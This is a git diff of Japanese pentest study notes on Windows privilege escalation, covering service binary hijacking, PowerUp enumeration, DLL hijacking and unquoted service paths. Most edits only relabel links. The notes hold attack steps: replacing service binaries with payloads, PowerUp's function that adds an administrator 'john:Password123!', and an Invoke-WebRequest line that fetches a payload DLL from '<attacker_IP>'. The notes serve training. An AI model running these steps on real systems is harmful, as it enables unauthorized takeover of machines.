@@ -21,15 +21,15 @@
 1. [サービスの列挙](🔍Windows%20Local%20Enumeration.md#サービスの列挙)で、StartNameが"LocalSystem"であるサービスを探す
 > [!TIP]
 > - Stateが"Stopped"のサービスをスタートするには、一般的には高権限が必要なため、権限昇格ベクターとしての優先度は低い
-> - どのサービスバイナリを書き換えればいいのかわからない場合は、[💥Windows Privilege Escalation](#Service%20Binary%20Hijacking%20w/%20PowerUp（自動）)で列挙することも検討する
+> - どのサービスバイナリを書き換えればいいのかわからない場合は、[Service Binary Hijacking w/ PowerUp（自動）](#Service%20Binary%20Hijacking%20w/%20PowerUp（自動）)で列挙することも検討する
 > 
 
-2. 実行バイナリのパーミッションが(F)もしくは(M)であることを確認（[権限関連の知識、コマンド](../Common/権限関連の知識、コマンド.md#パーミッションの読み方)）
+2. 実行バイナリのパーミッションが(F)もしくは(M)であることを確認（[ACL](../Common/権限関連の知識、コマンド.md#ACL)）
 ```powershell
 icacls '<binary_path>'
 ```
 
-3. [💥Windows Privilege Escalation](#バイナリのペイロード)を用意し、本来の実行バイナリのbkupはとった上で上書き
+3. [バイナリのペイロード](#バイナリのペイロード)を用意し、本来の実行バイナリのbkupはとった上で上書き
 ```powershell
 mv "<binary_path>" <binary.exe.bkup>
 mv <path_to_payload> "<binary_path>"
@@ -41,7 +41,7 @@ mv <path_to_payload> "<binary_path>"
 net stop <service_name>
 net start <service_name>
 ```
-- [💥Windows Privilege Escalation](#Tips%20サービスの開始、終了に失敗したとき)
+- [💡Tip:サービスの開始、終了に失敗したとき](#💡Tip%20サービスの開始、終了に失敗したとき)
 
 ### Service Binary Hijacking w/ PowerUp（自動）
 
@@ -67,39 +67,39 @@ Get-ModifiableServiceFile
 
 ↓バイナリが書換え可能なサービスの自動列挙出力
 
-| 出力                              | 意味                                                                                     | 備考                           |
-| ------------------------------- | -------------------------------------------------------------------------------------- | ---------------------------- |
-| ServiceName                     | サービスバイナリを編集(M)できるサービス名                                                                 | -                            |
-| ModifiableFile                  | 編集可能なサービスバイナリのパス                                                                       | -                            |
-| ModifiableFileIdentityReference | サービスバイナリを編集可能なプリンシパル(ユーザー、グループ)                                                        | 自身のグループが表示されているかどうか確認        |
-| StartName                       | サービスを動作させるプリンシパル                                                                       | *LocalSystem*＝権限昇格の可能性有      |
-| *AbuseFunction*                 | 出力されたコマンドを実行すれば、`john:Password123!`というユーザーを作成し、local administratorsグループに追加し、サービスを再起動する | 🚨うまくいかない時がある。その場合は手動で実行する。  |
-| CanRestart                      | netでサービスを再起動できるかどうか                                                                    | [💥Windows Privilege Escalation](#💡Tip%20サービスの開始、終了に失敗したとき) |
+| 出力                              | 意味                                                                                     | 備考                                                    |
+| ------------------------------- | -------------------------------------------------------------------------------------- | ----------------------------------------------------- |
+| ServiceName                     | サービスバイナリを編集(M)できるサービス名                                                                 | -                                                     |
+| ModifiableFile                  | 編集可能なサービスバイナリのパス                                                                       | -                                                     |
+| ModifiableFileIdentityReference | サービスバイナリを編集可能なプリンシパル(ユーザー、グループ)                                                        | 自身のグループが表示されているかどうか確認                                 |
+| StartName                       | サービスを動作させるプリンシパル                                                                       | *LocalSystem*＝権限昇格の可能性有                               |
+| *AbuseFunction*                 | 出力されたコマンドを実行すれば、`john:Password123!`というユーザーを作成し、local administratorsグループに追加し、サービスを再起動する | 🚨うまくいかない時がある。その場合は手動で実行する。                           |
+| CanRestart                      | netでサービスを再起動できるかどうか                                                                    | [💡Tip:サービスの開始、終了に失敗したとき](#💡Tip%20サービスの開始、終了に失敗したとき) |
 
 ---
 
 ## Service Exploits - DLL Hijacking
 
-- DLL Hijackingにあたって必要な基本的な理解：[1. Windows Internal](../../TryHackME/Red%20Teaming/4.%20Host%20Evasions/1.%20Windows%20Internal.md#DLL)
+- DLL Hijackingにあたって必要な基本的な理解：[DLL](../../TryHackME/Red%20Teaming/4.%20Host%20Evasions/1.%20Windows%20Internal.md#DLL)
 
 1. インストール済みアプリケーションもしくはサービスで、DLL Hijackingに脆弱なアプリケーションを探す
-	- アプリケーションの列挙：[🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#インストール済みアプリケーションの列挙)
-	- 公開エクスプロイトの探索：[Module 13：Locating Public Exploits](../../PEN-200/Module%2013：Locating%20Public%20Exploits.md#SearchSploit)
-	- サービスの列挙：[🔍Windows Local Enumeration](🔍Windows%20Local%20Enumeration.md#サービスの列挙)
+	- アプリケーションの列挙：[インストール済みアプリケーションの列挙](🔍Windows%20Local%20Enumeration.md#インストール済みアプリケーションの列挙)
+	- 公開エクスプロイトの探索：[SearchSploit](../../PEN-200/Module%2013：Locating%20Public%20Exploits.md#SearchSploit)
+	- サービスの列挙：[サービスの列挙](🔍Windows%20Local%20Enumeration.md#サービスの列挙)
 
-2. [1. Windows Internal](../../TryHackME/Red%20Teaming/4.%20Host%20Evasions/1.%20Windows%20Internal.md#Safe%20DLL%20Search%20Modeの探索順序)に従って、書込み可能(W) or (M)なディレクトリを明らかにする
+2. [Safe DLL Search Modeの探索順序](../../TryHackME/Red%20Teaming/4.%20Host%20Evasions/1.%20Windows%20Internal.md#Safe%20DLL%20Search%20Modeの探索順序)に従って、書込み可能(W) or (M)なディレクトリを明らかにする
 ```powershell
 icacls '<directory_path>'
 ```
 
-3. [権限関連の知識、コマンド](../Common/権限関連の知識、コマンド.md#🪟Windows)に記載の通り、icaclsで書込み可能であっても実際には書込みできないケースもあるので、テストファイルを作成して実際に書き込めるかどうかを検証する
+3. [🪟Windows](../Common/権限関連の知識、コマンド.md#🪟Windows)に記載の通り、icaclsで書込み可能であっても実際には書込みできないケースもあるので、テストファイルを作成して実際に書き込めるかどうかを検証する
 	- （例）FileZilaのアプリケーションの実行ディレクトリに書込み可能かどうかの検証（実行ファイルのパスが`C:\FileZilla\FileZilla FTP Client\filezilla.exe`の場合）
 ```powershell
 echo 'test' > 'C:\FileZilla\FileZilla FTP Client\test.txt'
 type 'C:\FileZilla\FileZilla FTP Client\test.txt'
 ```
 
-4. 対象のバイナリをローカルにインストールしたうえ(※)で、管理者権限でProcess Monitorを実行し、フィルターを設定する([🛠️Windows Sysintarnals](../../Tools/🛠️Windows%20Sysintarnals.md#Process%20Monitor))
+4. 対象のバイナリをローカルにインストールしたうえ(※)で、管理者権限でProcess Monitorを実行し、フィルターを設定する([Process Monitor](../../Tools/🛠️Windows%20Sysintarnals.md#Process%20Monitor))
 	- ⏳フィルターの条件：
 		- Process Name is `<アプリケーション.exe>` then Include
 		- Operation is CreateFile(※) then Include
@@ -113,14 +113,14 @@ New-Service -Name "<service_name>" -BinaryPathName "<path_to_binary>" -DisplayNa
 sc.exe query "<service_name>"
 sc.exe start "<service_name>"
 ```
-- →[1. Windows Internal](../../TryHackME/Red%20Teaming/4.%20Host%20Evasions/1.%20Windows%20Internal.md#Safe%20DLL%20Search%20Modeの探索順序)を念頭に当該レコードが先にロードされることを確かめる
+- →[Safe DLL Search Modeの探索順序](../../TryHackME/Red%20Teaming/4.%20Host%20Evasions/1.%20Windows%20Internal.md#Safe%20DLL%20Search%20Modeの探索順序)を念頭に当該レコードが先にロードされることを確かめる
 ![](../../画像ファイル/Pasted%20image%2020250816122522.png)
 $$Result列がNot　Foundとなっている例$$
 
 > [!WARNING]
 > 単純にバイナリをダウンロードして実行しても書き換え対象のDLLが正しく表示されないので、サービスとして実行すること。
 
-7. ペイロードを用意する（[💥Windows Privilege Escalation](#Malicious%20DLL)）
+7. ペイロードを用意する（[Malicious DLL](#Malicious%20DLL)）
 
 8. ターゲットマシンに戻り、"NAME NOT FOUND"となっているパスのDLLを用意したペイロードで上書きする
 ```powershell
@@ -128,7 +128,7 @@ Invoke-WebRequest -Uri 'http://<attacker_IP>:<port>/<payload.dll>' -OutFile '<NA
 ```
 
 8. サービスが再起動されるのを待つか、手動でサービスを再起動する
-	- サービスは[💥Windows Privilege Escalation](#sc.exeによる再起動)で再起動
+	- サービスは[sc.exeによる再起動](#sc.exeによる再起動)で再起動
 
 ---
 
@@ -161,7 +161,7 @@ $$サービスによる実行可能ファイルパス解釈順序の例$$
 	- サービスバイナリに空白がある
 	- サービスバイナリがクオテーションで囲まれていない
 
-2. 実行可能ファイルパス解釈順序を参考に、書込み可能 (W) or (M)なディレクトリを探す（[💥Windows Privilege Escalation](#Unquoted%20Service%20Pathに関する前提事項)）
+2. 実行可能ファイルパス解釈順序を参考に、書込み可能 (W) or (M)なディレクトリを探す（[Unquoted Service Pathに関する前提事項](#Unquoted%20Service%20Pathに関する前提事項)）
 ```powershell
 icacls '<dir_path>'
 # 具体例
